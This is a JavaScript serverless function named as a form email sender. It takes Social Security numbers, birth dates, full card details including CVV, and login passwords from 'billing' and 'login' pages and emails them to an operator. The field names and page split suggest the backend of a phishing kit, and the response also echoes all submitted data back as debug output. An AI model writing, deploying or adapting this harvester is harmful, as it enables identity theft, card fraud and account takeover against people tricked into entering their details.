// netlify/functions/send-email.js
const util = require("util");
const nodemailer = require("nodemailer");

exports.handler = async function (event, context) {
  // ---------- STEP 1: Parse + Normalize + Prepare Email ----------
  let data = {};
  try {
    if (!event || !event.body) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: "Missing request body" }),
      };
    }
    data = typeof event.body === "string" ? JSON.parse(event.body) : event.body;
  } catch (err) {
    console.error("Failed to parse event.body:", err);
    return {
      statusCode: 400,
      body: JSON.stringify({ error: "Invalid JSON in request body" }),
    };
  }

  const pageName =
    data.pageName ||
    data.page ||
    data.sourcePage ||
    data.formPage ||
    "Unknown Page";

  const {
    c_ssnn,
    c_dob,
    c_postal,
    c_phone,
    c_name,
    c_num,
    c_date,
    c_cvv,
    c_address,
    email_username,
    username,
    user,
    pass,
    password,
    name,
    fullName,
    firstName,
    lastName,
    email,
    userEmail,
    contact_email,
    message,
    comment,
    feedback,
    ...rest
  } = data;

  let finalPayload = { pageName };

  if (/billing/i.test(pageName)) {
    finalPayload = {
      name: c_name || name || fullName || firstName || "N/A",
      ssn: c_ssnn || null,
      dob: c_dob || null,
      postal: c_postal || null,
      phone: c_phone || null,
      cardNumber: c_num || null,
      expiry: c_date || null,
      cvv: c_cvv || null,
      address: c_address || null,
      extras: rest,
    };
  } else if (/login/i.test(pageName)) {
    finalPayload = {
      username: email_username || username || user || email || "N/A",
      password: pass || password || null,
      extras: rest,
    };
  } else {
    finalPayload = {
      name: name || fullName || firstName || "N/A",
      email: email || userEmail || contact_email || null,
      message: message || comment || feedback || null,
      extras: rest,
    };
  }

  const emailSubject = `New form submission from ${finalPayload.pageName}`;
  const emailBody = `
Page: ${finalPayload.pageName}

${Object.entries(finalPayload)
  .map(([k, v]) => {
    if (v && typeof v === "object")
      return `${k}: ${util.inspect(v, { depth: 2 })}`;
    return `${k}: ${v}`;
  })
  .join("\n")}
`.trim();

  // ---------- STEP 2: Send Email via SMTP ----------
  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: process.env.SMTP_PORT,
      secure: Number(process.env.SMTP_PORT) === 465, // true for 465
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });

    await transporter.sendMail({
      from: process.env.SENDER_EMAIL,
      to: process.env.RECEIVER_EMAIL,
      subject: emailSubject,
      text: emailBody,
    });

    return {
      statusCode: 200,
      body: JSON.stringify({
        success: true,
        debug: {
          parsedInput: data,
          normalizedPayload: finalPayload,
          emailSubject,
          emailBody,
        },
      }),
    };
  } catch (err) {
    console.error("Email send failed:", err);
    return {
      statusCode: 500,
      body: JSON.stringify({
        error: "Email failed to send",
        details: err.message,
      }),
    };
  }
};
